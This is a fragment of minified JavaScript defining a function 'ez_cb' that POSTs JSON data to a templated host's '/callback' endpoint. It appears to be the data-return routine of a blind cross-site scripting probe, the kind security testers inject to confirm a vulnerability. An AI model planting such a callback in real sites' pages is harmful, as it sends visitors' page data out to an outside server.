...
function ez_cb(t,e){var n=new XMLHttpRequest;n.open("POST",("https:"!==window.parent.location.protocol?"http:":"https:")+"//{{domain}}/callback",!0),n.setRequestHeader("Content-type","text/plain"),n.timeout=6e4,n.onreadystatechange=function(){4===n.readyState&&200===n.status&&null!==e&&e(n.responseText)},n.send(JSON.stringify(t))}
